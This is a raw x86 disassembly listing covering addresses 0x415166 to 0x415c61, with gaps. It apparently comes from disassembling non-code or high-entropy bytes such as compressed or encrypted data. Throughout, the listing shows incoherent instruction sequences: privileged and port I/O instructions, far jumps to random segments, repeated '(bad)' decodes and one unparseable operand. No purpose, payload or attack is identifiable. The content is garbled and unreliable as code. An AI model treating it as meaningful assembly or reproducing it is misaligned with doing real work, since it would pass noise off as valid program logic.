  415166:	xor    ah,BYTE PTR [edx]
  415168:	enter  0x97ad,0x75
  41516c:	jl     0x4151de
  41516e:	mov    edx,ebp
  415170:	inc    ebx
  415171:	hlt    
  415172:	or     DWORD PTR [ecx],ecx
  415174:	neg    bh
  415176:	or     DWORD PTR [edx-0x6e],ebp
  415179:	punpcklbw mm6,DWORD PTR [esp+eax*8+0x34]
  41517e:	out    0xb9,eax
  415180:	nop
  415181:	retf   
  415182:	jno    0x415109
  415184:	pop    DWORD PTR [ecx+0x5d]
  415187:	push   es
  415188:	(bad)  
  415189:	adc    DWORD PTR [edi],ebp
  41518b:	inc    esp
  41518c:	out    0xde,al
  41518e:	adc    BYTE PTR ds:0xca0de520,0x7c
  415195:	das    
  415196:	dec    edi
  415197:	stos   DWORD PTR es:[edi],eax
  415198:	sahf   
  415199:	mov    eax,0xa40fd075
  41519e:	pusha  
  41519f:	mov    BYTE PTR [edx+0x52],0x93
  4151a3:	cs push ebp
  4151a5:	dec    esi
  4151a6:	dec    ebx
  4151a7:	test   BYTE PTR [edi+ecx*2+0x508fc67a],bh
  4151ae:	or     BYTE PTR [ebp+0x59137516],ah
  4151b4:	push   ds
  4151b5:	andps  xmm1,XMMWORD PTR [edx]
  4151b8:	dec    esp
  4151b9:	pusha  
  4151ba:	push   eax
  4151bb:	push   0x111a5527
  4151c0:	fldcw  WORD PTR [edx-0x57]
  4151c3:	add    DWORD PTR [esi-0x1d],esp
  4151c6:	pop    esi
  4151c7:	and    ah,BYTE PTR [ecx]
  4151c9:	dec    ebp
  4151ca:	jmp    0x5158d2ab
  4151cf:	sbb    al,0x87
  4151d1:	test   BYTE PTR [eax-0x6b82ebc2],ah
  4151d7:	sti    
  4151d8:	fnstcw WORD PTR [edi-0x7f0d38d2]
  4151de:	jbe    0x41524e
  4151e0:	sbb    al,0x3
  4151e2:	jle    0x415256
  4151e4:	and    DWORD PTR [ebp+0x6b],esi
  4151e7:	js     0x4151d4
  4151e9:	mov    ah,BYTE PTR [esi+0x59]
  4151ec:	icebp  
  4151ed:	sbb    BYTE PTR [eax-0x5298a2a7],cl
  4151f3:	push   ebx
  4151f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f6:	in     al,dx
  4151f7:	dec    edi
  4151f8:	test   al,0x50
  4151fa:	mov    ebp,0xbcf8609e
  4151ff:	inc    esp
  415201:	nop
  415202:	test   eax,0x340853e
  415207:	clc    
  415208:	lock test al,0x1c
  41520b:	mov    bl,0x92
  41520d:	or     eax,0xeffd9e17
  415212:	js     0x41527a
  415214:	add    BYTE PTR [ebx+eax*8+0x9],0x8e
  415219:	loopne 0x4151d1
  41521b:	stc    
  41521c:	mov    bl,0xf
  41521e:	pop    eax
  41521f:	inc    ebp
  415220:	(bad)  
  415221:	pop    esp
  415222:	dec    edi
  415223:	aad    0x83
  415225:	(bad)  
  415226:	loopne 0x41521a
  415228:	in     al,dx
  415229:	jns    0x415220
  41522b:	pop    eax
  41522c:	adc    DWORD PTR [ebp-0x1b399abe],ebp
  415232:	mov    bl,0x30
  415234:	mov    ebp,DWORD PTR [eax-0x3dd81777]
  41523a:	fs adc esi,esp
  41523d:	mov    eax,0x38042045
	...
  4152b2:	add    BYTE PTR [eax],al
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	cs pop esi
  4152c2:	or     ch,BYTE PTR [esi+ebp*2]
  4152c5:	call   0x13752ca
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	rol    DWORD PTR ds:0x29888da0,cl
  4152d2:	mov    fs,WORD PTR [ecx]
  4152d4:	ja     0x415276
  4152d6:	push   esp
  4152d7:	jmp    0xd45f:0xcbc9d91b
  4152de:	fstp   DWORD PTR [edi]
  4152e0:	aaa    
  4152e1:	adc    DWORD PTR [edx+0x49fcb06],esp
  4152e7:	jns    0x4152a3
  4152e9:	cli    
  4152ea:	(bad)  
  4152eb:	stc    
  4152ec:	mov    al,ds:0x3b58020
  4152f1:	mov    eax,ds:0x9bfc9403
  4152f6:	cmp    eax,0x5a6b7dec
  4152fb:	mov    cl,BYTE PTR [esi]
  4152fd:	repnz fcmovnbe st,st(5)
  415300:	or     DWORD PTR [esi],eax
  415302:	es mov edi,0x1fc94d83
  415308:	xchg   esp,eax
  415309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41530a:	(bad)  
  41530b:	jb     0x4152aa
  41530d:	push   ss
  41530e:	fild   DWORD PTR ds:0x29ab1eab
  415314:	rol    BYTE PTR [ecx-0x6],0x77
  415318:	mov    fs,WORD PTR [edx+0x63]
  41531b:	cmp    eax,0xfacbaaf2
  415320:	loope  0x4152ed
  415322:	jmp    0xaef98a99
  415327:	jp     0x4152bc
  415329:	inc    DWORD PTR [edi-0x37]
  41532c:	pop    ds
  41532d:	and    DWORD PTR [eax],ecx
  41532f:	js     0x415370
  415331:	pusha  
  415332:	xchg   bh,dl
  415334:	fist   WORD PTR [ebx-0x6b7e192f]
  41533a:	mov    DWORD PTR [eax+0x6],esi
  41533d:	add    esp,DWORD PTR [eax]
  41533f:	push   eax
  415340:	sub    dh,BYTE PTR ds:0x6eca57b0
  415346:	into   
  415347:	inc    eax
  415348:	fisub  DWORD PTR [edx+ebx*1-0x52]
  41534c:	inc    edx
  41534d:	jbe    0x41533f
  41534f:	int3   
  415350:	jp     0x4153bb
  415352:	gs push 0xe33a4e2e
  415358:	sub    al,0x1e
  41535a:	add    dh,cl
  41535c:	mov    ah,0x69
  41535e:	pushf  
  41535f:	pop    eax
  415360:	sbb    eax,0xf0322fbc
  415365:	ret    0x8a48
  415368:	cmp    BYTE PTR [ebx*2-0x70f38683],bl
  41536f:	and    al,al
  415371:	jbe    0x415385
  415373:	pop    ds
  415374:	pop    esi
  415375:	test   eax,0x6b3cb1f3
  41537a:	fimul  WORD PTR [ebp-0x41]
  41537d:	and    DWORD PTR [ebx-0xc],ebx
  415380:	shl    edx,0x60
  415383:	clc    
  415384:	push   esp
  415385:	mov    cl,0xc4
  415387:	mov    bh,0x8e
  415389:	cs and eax,0x28a28385
  41538f:	jecxz  0x415373
  415391:	push   cs
  415392:	push   edi
  415393:	pop    ebx
  415394:	daa    
  415395:	les    edx,FWORD PTR [eax+0x68]
  415398:	hlt    
  415399:	pushf  
  41539a:	ds sbb al,0x34
  41539d:	stos   BYTE PTR es:[edi],al
  41539e:	icebp  
  41539f:	daa    
  4153a0:	(bad)  
  4153a1:	sub    BYTE PTR [edx+0x76dc6a44],dl
  4153a7:	es repnz pop ss
  4153aa:	into   
  4153ab:	dec    ebx
  4153ac:	push   ebx
  4153ad:	xor    ebp,DWORD PTR [edi-0x10]
  4153b0:	fimul  DWORD PTR [esi+0x3145d367]
  4153b6:	sbb    cl,BYTE PTR [edi-0xb]
  4153b9:	and    bh,BYTE PTR [edi]
  4153bb:	ds popa 
  4153bd:	dec    esp
  4153be:	call   0x6e6520
	...
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	addr16 test al,0x89
  415443:	xchg   edx,eax
  415444:	fs jmp 0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	lock div BYTE PTR [eax]
  41544f:	inc    esp
  415450:	test   DWORD PTR [ecx+0x43eb340f],edi
  415456:	jb     0x415468
  415458:	xor    DWORD PTR [esi-0x7ce4191],ebp
  41545e:	sub    eax,0x50acfdc3
  415463:	cs scas al,BYTE PTR es:[edi]
  415465:	mov    dh,0x3a
  415467:	jl     0x415447
  415469:	jns    0x4154bf
  41546b:	adc    al,0x1b
  41546d:	scas   eax,DWORD PTR es:[edi]
  41546e:	mov    ch,0xf0
  415470:	add    ecx,DWORD PTR [edi]
  415472:	pop    edx
  415473:	mov    eax,0x4f6bdbe5
  415478:	mov    ebp,DWORD PTR [edx+0x41]
  41547b:	push   ebx
  41547c:	sub    DWORD PTR ds:0x88af0e34,ebp
  415482:	jno    0x41548b
  415484:	cmp    eax,0xf5cf5c0c
  415489:	clc    
  41548a:	aaa    
  41548b:	scas   eax,DWORD PTR es:[edi]
  41548c:	cdq    
  41548d:	outs   dx,DWORD PTR ds:[esi]
  41548e:	cmp    dh,BYTE PTR [esi+0x2e511496]
  415494:	jae    0x4154fb
  415496:	(bad)  
  415497:	aaa    
  415498:	inc    ecx
  415499:	jo     0x4154de
  41549b:	in     al,0xfc
  41549d:	cs xchg ecx,eax
  41549f:	add    al,0xe3
  4154a1:	sub    eax,DWORD PTR [eax-0x62]
  4154a4:	ret    
  4154a5:	push   cs
  4154a6:	mov    edx,0x6c315eda
  4154ab:	mov    BYTE PTR [esi+0x1f],bh
  4154ae:	xor    BYTE PTR [ebx+ecx*2+0x2d8ffd7b],dl
  4154b5:	mov    ecx,0x42e4d67f
  4154ba:	in     al,0x32
  4154bc:	mov    ch,BYTE PTR [ebp-0xad1a91b]
  4154c2:	imul   ecx,edx,0xffffffa4
  4154c5:	or     ebp,ebx
  4154c7:	ret    0x41cc
  4154ca:	scas   eax,DWORD PTR es:[edi]
  4154cb:	ins    BYTE PTR es:[edi],dx
  4154cc:	ret    
  4154cd:	jbe    0x4154ed
  4154cf:	jne    0x4154b4
  4154d1:	pop    ebx
  4154d2:	jb     0x41546d
  4154d4:	bound  esp,QWORD PTR [eax+eiz*8-0x73769d9a]
  4154db:	in     eax,0xb8
  4154dd:	push   0x5fe3a504
  4154e2:	and    al,0xca
  4154e4:	or     al,0xdf
  4154e6:	add    esp,DWORD PTR [ebx-0x19d532e8]
  4154ec:	xor    eax,0x4fbc73b8
  4154f1:	mov    ds:0xee88c19e,eax
  4154f6:	adc    BYTE PTR [ebp+edi*1-0x777d5e6f],bl
  4154fd:	pusha  
  4154fe:	aaa    
  4154ff:	jb     0x4154b2
  415501:	retf   0x8113
  415504:	sar    DWORD PTR [ebx-0x11ac82fd],cl
  41550a:	leave  
  41550b:	pop    esp
  41550c:	jnp    0x415559
  41550e:	mov    cr5,ebp
  415511:	adc    eax,0xb2ea4350
  415516:	sub    eax,0x96cbf2bb
  41551b:	fisub  WORD PTR [eax]
  41551d:	lods   eax,DWORD PTR ds:[esi]
  41551e:	mov    bl,0xb9
  415520:	adc    edi,DWORD PTR [eax]
  415522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415523:	pop    eax
  415524:	push   edi
  415525:	not    DWORD PTR [esi]
  415527:	and    al,0x61
  415529:	hlt    
  41552a:	out    dx,eax
  41552b:	in     al,0xe2
  41552d:	test   DWORD PTR [ecx+edi*8],edi
  415530:	push   edi
  415531:	inc    ebx
  415532:	aas    
  415533:	js     0x4154f5
  415535:	je     0x415576
  415537:	scas   al,BYTE PTR es:[edi]
  415538:	pop    esi
  415539:	loope  0x415521
  41553b:	pop    esi
  41553c:	inc    DWORD PTR ds:0x145d296c
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	pop    ebx
  4155c1:	retf   0x74c6
  4155c4:	pop    edx
  4155c5:	jmp    0x0:0xf60000
  4155cc:	rcl    bl,0xfd
  4155cf:	imul   esi,DWORD PTR [ebx+ecx*8],0xd02b7f34
  4155d6:	mov    ds:0x6f608678,eax
  4155db:	add    eax,0xa84b5586
  4155e0:	rcl    DWORD PTR [edi+eiz*8-0x38175d6d],0xc1
  4155e8:	adc    edi,DWORD PTR [edx-0x1ec93dd1]
  4155ee:	adc    ch,ch
  4155f0:	cmp    bl,ah
  4155f2:	or     DWORD PTR [ecx+0x37712c92],ebx
  4155f8:	in     eax,0x70
  4155fa:	inc    esp
  4155fb:	cmp    al,0xd7
  4155fd:	loopne 0x415588
  4155ff:	cwde   
  415600:	mov    dl,0xdd
  415602:	jae    0x41567d
  415604:	push   0x44
  415606:	loopne 0x41566c
  415608:	call   0x93eaba3c
  41560d:	scas   al,BYTE PTR es:[edi]
  41560e:	inc    esi
  41560f:	and    ecx,ecx
  415611:	mov    esi,0x8efa1072
  415616:	mov    dh,BYTE PTR [ecx+0x77f22aed]
  41561c:	inc    ebx
  41561d:	xchg   edi,eax
  41561e:	mov    al,0x2f
  415620:	jb     0x415668
  415622:	and    DWORD PTR [ebp-0x52],edx
  415625:	out    dx,eax
  415626:	sbb    eax,0x1232d83f
  41562b:	out    dx,al
  41562c:	and    eax,0x193c7fd
  415631:	sub    al,BYTE PTR [ebp+ebp*4-0x59]
  415635:	and    BYTE PTR [ebx-0x63],al
  415638:	pop    ds
  415639:	push   0xa8ba7e5
  41563e:	icebp  
  41563f:	ds jae 0x415624
  415642:	mov    WORD PTR [ebp+esi*1-0x5cae6a45],ss
  415649:	push   ebp
  41564a:	test   BYTE PTR [edi-0x5c],ch
  41564d:	gs test eax,0x7f5aae05
  415653:	mov    ds:0xbe8a11b5,eax
  415658:	pop    ebx
  415659:	or     al,al
  41565b:	outs   dx,BYTE PTR ds:[esi]
  41565c:	jge    0x4155f2
  41565e:	mov    ?,ecx
  415660:	cmp    eax,0x8dced2bc
  415665:	cmp    bl,dh
  415667:	dec    ebx
  415668:	inc    edi
  415669:	xchg   esp,eax
  41566a:	xor    DWORD PTR [ebx-0x5f1d860d],ebp
  415670:	test   BYTE PTR [esi-0x35f607ae],dl
  415676:	pusha  
  415677:	cmp    al,0x6
  415679:	imul   edi,DWORD PTR [esi-0x31691f6a],0x56
  415680:	icebp  
  415681:	in     al,dx
  415682:	setae  al
  415685:	xlat   BYTE PTR ds:[ebx]
  415686:	out    0xfc,al
  415688:	adc    esp,0x71f22973
  41568e:	xchg   esp,eax
  41568f:	aam    0x6e
  415691:	mov    ah,0xa7
  415693:	loopne 0x4156d4
  415695:	aam    0xc9
  415697:	pushf  
  415698:	aam    0x61
  41569a:	ja     0x4156cb
  41569c:	or     eax,0x28dd6664
  4156a1:	in     eax,dx
  4156a2:	sbb    esi,ebx
  4156a4:	jmp    0xcde99e99
  4156a9:	adc    al,0xe8
  4156ab:	xor    eax,0xbc63ee52
  4156b0:	repnz adc eax,0x72d905bb
  4156b6:	outs   dx,DWORD PTR ds:[esi]
  4156b7:	and    eax,0x6f2660d1
  4156bc:	repz imul eax,esi,0xbd2922
	...
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xaa12e2d3
  415743:	rcl    BYTE PTR [eax-0x15],cl
  415746:	add    BYTE PTR [eax],al
  415748:	test   BYTE PTR [eax],0x0
  41574b:	add    BYTE PTR [ecx],bl
  41574d:	add    bh,cl
  41574f:	cmp    ah,BYTE PTR [edx+0x37]
  415752:	push   ds
  415753:	mov    edx,0x9a166216
  415758:	jns    0x415766
  41575a:	xchg   BYTE PTR [ecx-0x6b],ch
  41575d:	dec    ecx
  41575e:	add    edi,DWORD PTR [edi-0x7d]
  415761:	mov    ah,0x9e
  415763:	inc    BYTE PTR [edi]
  415765:	shl    ebp,1
  415767:	mov    esi,0x6c11906a
  41576c:	mov    edi,0xb299b035
  415771:	dec    ebx
  415772:	lahf   
  415773:	inc    DWORD PTR [eax+0x7dde2af5]
  415779:	xchg   edi,eax
  41577a:	lea    eax,[edi]
  41577c:	les    ebp,FWORD PTR [edx-0x4b]
  41577f:	dec    esi
  415780:	sti    
  415781:	push   esi
  415782:	add    eax,0xd8aea4b7
  415787:	scas   eax,DWORD PTR es:[edi]
  415788:	xlat   BYTE PTR ds:[ebx]
  415789:	test   eax,0x2c65ff81
  41578e:	loope  0x41578c
  415790:	push   esp
  415791:	retf   0x5acc
  415794:	xor    ecx,eax
  415796:	mov    ch,0xd3
  415798:	push   ebp
  415799:	mov    ds:0xe0b5aa63,eax
  41579e:	int3   
  41579f:	xor    edx,DWORD PTR [ebp+0x4375886a]
  4157a5:	enter  0x149e,0xd3
  4157a9:	and    al,0xe4
  4157ab:	js     0x415826
  4157ad:	arpl   dx,bp
  4157af:	repz cli 
  4157b1:	pop    edx
  4157b2:	je     0x41576e
  4157b4:	push   cs
  4157b5:	imul   ebp,DWORD PTR [edx+0x4f],0x521c2537
  4157bc:	push   eax
  4157bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157be:	mov    edi,0x408d0f8c
  4157c3:	sub    esp,DWORD PTR [ebp-0x28c638d9]
  4157c9:	and    dl,BYTE PTR [edx-0x50]
  4157cc:	or     al,0x20
  4157ce:	add    ebp,0xffffffe3
  4157d1:	xor    DWORD PTR [edi-0x7843e2b6],ebx
  4157d7:	(bad)  
  4157d9:	je     0x4157d7
  4157db:	lods   eax,DWORD PTR ds:[esi]
  4157dc:	dec    ecx
  4157dd:	push   ds
  4157de:	dec    eax
  4157df:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4157e1:	gs push ecx
  4157e3:	jmp    0x415781
  4157e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e6:	pop    ebp
  4157e7:	fdiv   DWORD PTR [edi]
  4157e9:	out    0x4d,al
  4157eb:	push   ebx
  4157ec:	stos   DWORD PTR es:[edi],eax
  4157ed:	ret    0x184a
  4157f0:	jmp    0x9ae1:0x5f5a1235
  4157f7:	mov    edx,0xa1e5c56d
  4157fc:	adc    al,0xe6
  4157fe:	push   0xffffffac
  415800:	ins    BYTE PTR es:[edi],dx
  415801:	std    
  415802:	mov    ds:0x9647f37d,al
  415807:	fcmovnb st,st(4)
  415809:	rcr    BYTE PTR [ecx*1+0x1f18563],0x81
  415811:	or     BYTE PTR [edx-0x726e77b6],dh
  415817:	call   0x2739:0x3cfdfeb
  41581e:	adc    al,BYTE PTR [edx]
  415820:	pop    ebp
  415821:	cwde   
  415822:	aad    0x2d
  415824:	scas   al,BYTE PTR es:[edi]
  415825:	in     eax,0xbe
  415827:	bound  esi,QWORD PTR fs:[edx]
  41582a:	gs pop ecx
  41582c:	dec    eax
  41582d:	inc    ebx
  41582e:	mov    DWORD PTR [esi-0x1c46a0c2],eax
  415834:	aad    0x2b
  415836:	test   al,0x1b
  415838:	pusha  
  415839:	fcomi  st,st(1)
  41583b:	repnz mov ds:0x85a698f9,eax
  415841:	add    al,0x0
	...
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x4313f6fe
  4158c3:	imul   eax,DWORD PTR [esi-0x14],0xf60000
  4158ca:	add    BYTE PTR [eax],al
  4158cc:	or     DWORD PTR [esi-0x1185722f],0xc8d2f30b
  4158d6:	jmp    0xe85e:0x4a716f4f
  4158dd:	aad    0xd5
  4158df:	cmp    ch,BYTE PTR [edi-0x8]
  4158e2:	(bad)  [eax+ecx*2+0x4d]
  4158e6:	sbb    al,0xcb
  4158e8:	xchg   esp,eax
  4158e9:	js     0x415958
  4158eb:	dec    eax
  4158ec:	cmp    eax,0xc3177f48
  4158f1:	ret    
  4158f2:	shl    WORD PTR [ebp+0x3e],1
  4158f6:	stos   DWORD PTR es:[edi],eax
  4158f7:	in     eax,dx
  4158f8:	push   0xffffffe7
  4158fa:	repz pop ss
  4158fc:	and    DWORD PTR [ebp+edi*4-0x6e],0xb8842b4e
  415904:	push   edx
  415905:	mov    edx,0xb6d8f353
  41590a:	cli    
  41590b:	ret    
  41590c:	(bad)  
  41590d:	(bad)  
  41590e:	add    eax,0xb8a920bb
  415913:	mov    eax,ebp
  415915:	data16 sahf 
  415917:	sbb    DWORD PTR [edi+0x7d],0xffffffea
  41591b:	pop    edi
  41591c:	ja     0x415924
  41591e:	pushf  
  41591f:	xchg   cl,al
  415921:	ror    BYTE PTR [eax],cl
  415923:	jmp    0xc575:0x1a760e3a
  41592a:	inc    esp
  41592b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592c:	test   eax,0x56e8f9fd
  415931:	mov    ecx,0x2cf97ff4
  415936:	jne    0x41593d
  415938:	xchg   edi,eax
  415939:	sbb    DWORD PTR [edx+eax*8+0x2d624d26],edi
  415940:	mov    edi,0xe0872866
  415945:	imul   edx,DWORD PTR [ebx+0x6],0x9a327658
  41594c:	jmp    0x415970
  41594e:	sar    bl,1
  415950:	mov    esp,0x9defe2d
  415955:	xchg   edx,eax
  415956:	sbb    eax,0x47e7f5b5
  41595b:	ja     0x41590b
  41595d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595e:	jle    0x4159d7
  415960:	les    ebp,FWORD PTR [eax]
  415962:	(bad)  
  415963:	pop    ss
  415964:	loope  0x4159c0
  415966:	(bad)  
  415967:	mov    dh,0x9d
  41596a:	enter  0x8b86,0xac
  41596e:	xor    ecx,DWORD PTR [esi]
  415970:	test   eax,0xe8de5ad7
  415975:	and    eax,0xd5014b04
  41597a:	aad    0x9c
  41597c:	inc    edi
  41597d:	nop
  41597e:	pop    es
  41597f:	outs   dx,BYTE PTR ds:[esi]
  415980:	rcl    BYTE PTR [edx-0x77b77287],cl
  415986:	mov    al,0x33
  415988:	push   es
  415989:	(bad)  
  41598a:	lea    ebp,[ebp+0x77]
  41598d:	pusha  
  41598e:	cmp    BYTE PTR [ebx+0x31],ah
  415991:	ins    DWORD PTR es:[edi],dx
  415992:	sahf   
  415993:	fild   WORD PTR [esi+0xe67d536]
  415999:	xchg   esp,eax
  41599a:	(bad)  
  41599c:	and    BYTE PTR [edx+0xe6f15de],0xf5
  4159a3:	int3   
  4159a4:	pop    es
  4159a5:	jne    0x415a07
  4159a7:	push   ebx
  4159a8:	hlt    
  4159a9:	cli    
  4159aa:	out    dx,al
  4159ab:	shr    DWORD PTR [ebx+ecx*8+0x29d323a7],0x35
  4159b3:	inc    eax
  4159b4:	and    eax,0xf3cf420
  4159b9:	mov    ds:0x2aa4b222,al
  4159be:	push   ecx
  4159bf:	pop    ss
  4159c0:	pop    esp
  4159c1:	lods   al,BYTE PTR ds:[esi]
	...
  415a32:	add    BYTE PTR [eax],al
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	pop    esi
  415a41:	imul   esi,DWORD PTR [eax],0xed3c87
  415a47:	add    dh,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    dh,ch
  415a4d:	imul   ecx,DWORD PTR [eax],0x6413141d
  415a53:	retf   0xf479
  415a56:	loop   0x415a9c
  415a58:	jmp    DWORD PTR [ebx+0x64194f35]
  415a5e:	popf   
  415a5f:	repnz sbb edx,esp
  415a62:	clc    
  415a63:	push   eax
  415a64:	or     bl,ch
  415a66:	pop    es
  415a67:	jmp    0x415a88
  415a69:	scas   eax,DWORD PTR es:[edi]
  415a6a:	dec    edx
  415a6b:	pop    es
  415a6c:	pusha  
  415a6d:	and    al,0x4
  415a6f:	clc    
  415a70:	sbb    edi,DWORD PTR [edx+0x59]
  415a73:	pusha  
  415a74:	outs   dx,DWORD PTR ds:[esi]
  415a75:	dec    ebx
  415a76:	cmc    
  415a77:	outs   dx,DWORD PTR ds:[esi]
  415a78:	stc    
  415a79:	bound  ebp,QWORD PTR [esi-0x20]
  415a7c:	sbb    eax,0x358ed9d6
  415a81:	mov    cx,0xb9bd
  415a85:	test   dh,bl
  415a87:	test   al,0x54
  415a89:	pop    ebp
  415a8a:	popf   
  415a8b:	(bad)  
  415a8c:	jp     0x415a3c
  415a8e:	sub    ebx,DWORD PTR [ecx]
  415a90:	inc    edi
  415a91:	das    
  415a92:	dec    eax
  415a93:	cdq    
  415a94:	mov    dl,0xc2
  415a96:	push   ds
  415a97:	std    
  415a98:	sbb    dl,BYTE PTR [ecx]
  415a9a:	jae    0x415ae0
  415a9c:	jle    0x415b13
  415a9e:	or     edx,edx
  415aa0:	adc    al,cl
  415aa2:	(bad)  
  415aa3:	mov    dl,BYTE PTR [edx+0x197efdaf]
  415aa9:	dec    ecx
  415aaa:	mov    cl,0x37
  415aac:	std    
  415aad:	in     eax,0x11
  415aaf:	mov    esi,0x6ee6466a
  415ab4:	push   esi
  415ab5:	fadd   st,st(0)
  415ab7:	shr    DWORD PTR [esi],1
  415ab9:	ja     0x415a96
  415abb:	push   dx
  415abd:	imul   BYTE PTR [esi-0x47]
  415ac0:	mov    DWORD PTR [esi],esp
  415ac2:	test   al,0x31
  415ac4:	hlt    
  415ac5:	mov    ah,0x17
  415ac7:	xor    dl,BYTE PTR [ecx+ebp*4+0x67fe80a4]
  415ace:	mov    edx,0x6dbf696a
  415ad3:	xor    edi,DWORD PTR [eax-0x7bb854c1]
  415ad9:	or     ecx,0x788bec20
  415adf:	pop    es
  415ae0:	retf   0x5ae8
  415ae3:	add    al,0x5c
  415ae5:	pop    edi
  415ae6:	mov    dh,0x79
  415ae8:	push   esp
  415ae9:	dec    edx
  415aea:	xor    DWORD PTR [esi],0xffffffdf
  415aed:	jecxz  0x415b65
  415aef:	inc    ebx
  415af0:	push   ebp
  415af1:	dec    esp
  415af2:	mov    edi,0xf0ce11d4
  415af7:	fbld   TBYTE PTR [ebx]
  415af9:	inc    edx
  415afa:	sar    DWORD PTR [edx-0xa],1
  415afd:	std    
  415afe:	loopne 0x415ab5
  415b00:	xchg   esp,eax
  415b01:	inc    ebx
  415b02:	add    al,0x7
  415b04:	mov    bl,0xf1
  415b06:	iret   
  415b07:	add    al,0x75
  415b09:	pop    esp
  415b0a:	call   0xb62c:0x523f4d15
  415b11:	dec    ebx
  415b12:	mov    al,0xe5
  415b14:	jnp    0x415b88
  415b16:	add    ecx,esi
  415b18:	mov    ds:0x8ea6497e,eax
  415b1d:	data16 icebp 
  415b1f:	sub    dh,BYTE PTR [ebp+0x35629ea9]
  415b25:	pop    edi
  415b26:	rcr    dl,1
  415b28:	mov    eax,ds:0xdf82bbf8
  415b2d:	bound  edi,QWORD PTR [ebx-0x24]
  415b30:	out    0x80,eax
  415b32:	stos   DWORD PTR es:[edi],eax
  415b33:	mov    cl,0x2d
  415b35:	pop    ds
  415b36:	mov    BYTE PTR [esi],ch
  415b38:	sbb    BYTE PTR [edx+0x150e4dbb],0xa6
  415b3f:	scas   eax,DWORD PTR es:[edi]
  415b40:	pop    edi
  415b41:	add    BYTE PTR ss:[eax],al
	...
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	add    BYTE PTR ds:0xee329559,dh
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	test   BYTE PTR [eax],0x0
  415bcb:	add    BYTE PTR [eax],bl
  415bcd:	inc    ebx
  415bce:	xchg   esp,eax
  415bcf:	gs inc esi
  415bd1:	jno    0x415bde
  415bd3:	and    BYTE PTR [ebp-0x53],dh
  415bd6:	cmp    edx,eax
  415bd8:	dec    ecx
  415bd9:	pop    ebx
  415bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bdb:	mov    ds:0x14eeae41,eax
  415be0:	push   cs
  415be1:	pop    edi
  415be2:	pop    eax
  415be3:	in     eax,0x49
  415be5:	pop    es
  415be6:	xchg   ah,cl
  415be8:	jecxz  0x415bfb
  415bea:	adc    al,0x3
  415bec:	inc    edx
  415bed:	aas    
  415bee:	in     al,0x6e
  415bf0:	adc    eax,0xabd7b3f9
  415bf5:	xchg   ecx,eax
  415bf6:	test   BYTE PTR [edi],ah
  415bf8:	mov    BYTE PTR [edi],cl
  415bfa:	push   ds
  415bfb:	dec    eax
  415bfc:	push   dx
  415bff:	add    dl,BYTE PTR [edx-0x36]
  415c02:	xor    DWORD PTR [edx-0x18],edi
  415c05:	test   BYTE PTR [edi],cl
  415c07:	lahf   
  415c08:	xor    ebp,DWORD PTR [edi-0x1a9a1e53]
  415c0e:	(bad)  
  415c0f:	and    eax,DWORD PTR [edi]
  415c11:	and    DWORD PTR [ebp-0x14d92ee1],ebp
  415c17:	dec    ecx
  415c18:	sub    DWORD PTR [ebx],ebp
  415c1a:	cld    
  415c1b:	mov    eax,ds:0x91d32166
  415c20:	aam    0x50
  415c22:	test   DWORD PTR [ebx-0x1400203],ebp
  415c28:	shl    BYTE PTR [ecx+edi*8],cl
  415c2b:	and    al,0xe7
  415c2d:	lahf   
  415c2e:	jecxz  0x415c16
  415c30:	dec    edx
  415c31:	aam    0x9c
  415c33:	cdq    
  415c34:	scas   eax,DWORD PTR es:[edi]
  415c35:	cli    
  415c36:	mov    ch,0xf5
  415c38:	sahf   
  415c39:	das    
  415c3a:	jb     0x415ca8
  415c3c:	inc    esp
  415c3d:	mov    ecx,0xdde0865d
  415c42:	jle    0x415bec
  415c44:	pop    esp
  415c45:	jg     0x415bf2
  415c47:	lds    ebp,FWORD PTR [ebx-0x3137455e]
  415c4d:	dec    eax
  415c4e:	(bad)  [ebp-0x4c12bf5e]
  415c54:	or     edi,DWORD PTR [edx+0x5803ad9d]
  415c5a:	mov    edx,0xb1c74f64
  415c5f:	out    0xcf,al
  415c61:	aaa    
